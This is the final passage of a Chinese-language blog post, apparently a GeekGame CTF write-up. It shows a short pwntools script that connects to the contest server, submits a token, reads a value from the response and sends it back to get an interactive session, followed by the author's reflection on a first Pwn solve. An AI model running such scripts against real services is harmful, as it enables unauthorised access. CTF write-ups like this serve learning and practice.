</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;prob08.geekgame.pku.edu.cn&#39;</span><span class="p">,</span> <span class="mi">10008</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Please input your token: &#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;419:MEUCIAJK6pgIYBAyoFwq0WANA1qSkViRLHOVsB2NajlbxhH9AiEAzmCTUCGKE9DnSt61ANO8cw2GpWE6Zj-1iFuTRm8E4Vg=&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Choose one: &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">allData</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">allData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">validData</span> <span class="o">=</span> <span class="n">allData</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&lt;&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">validData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">validData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><br>
<h2 id="后记">后记</h2>
<p>去年做了编译助教，为了调试汇编被迫使用 pwndbg，于是学了点二进制。虽然这次剩了一些 Misc 题没有做，但这是我第一次在比赛中做出 Pwn 题，第一次拿到 shell，值得纪念。</p>
<p>今年 GPT4 已经会做小北问答和 TypeScript 的第一问了。恐怕我明年就要被 GPT5 取代了……</p>
    </div>

    <div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">Author</span>
    <span class="item-content">GWDx</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">LastMod</span>
    <span class="item-content">
        2024-06-28
        <a href="https://github.com/GWDx/GWDx.github.io/commit/d7fee4f71facd8080da8dc9eb2c32e23d78e9177" title="启用评论">(d7fee4f)</a>
    </span>
  </p>
  
  
</div>
<footer class="post-footer">
      <div class="post-tags">
          <a href="/tags/geekgame/">GeekGame</a>
          <a href="/tags/ctf/">CTF</a>
          </div>
      <nav class="post-nav">
        <a class="prev" href="/post/rm-rf/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">rm -rf 的教训</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        <a class="next" href="/post/nucleoside-analogue/">
            <span class="next-text nav-default">核苷类似物资料整合</span>
            <span class="next-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        


<div id="vcomments"></div>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments' ,
        appId: 'eZM94QLAn3n1uIyq9fgV9U3M-MdYXbMMI',
        appKey: '2l60rnkvKMig2YTvx5OSYETO',
        notify:  false ,
        verify:  false ,
        avatar:'mm',
        placeholder: '',
        visitor:  false ,
        serverURLs : 'https:\/\/ezm94qla.api.lncldglobal.com',
    });
</script>



      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="mailto:gwdx@mail.ustc.edu.cn" class="iconfont icon-email" title="email"></a>
      <a href="https://github.com/GWDx" class="iconfont icon-github" title="github"></a>
      <a href="https://space.bilibili.com/442365922" class="iconfont icon-bilibili" title="bilibili"></a>
  <a href="http://gwdx.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2022 - 
    2024<span class="heart"><i class="iconfont icon-heart"></i></span><span>GWDx</span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  <script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox-3.1.20.min.js"></script>



<script type="text/javascript" src="/js/main.min.5c93b1d90d4bc05350a680cf34fca805c5c13041075057bc584fe6d549c6186a.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'G-HBL65Q7HB4', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>







</body>
</html>
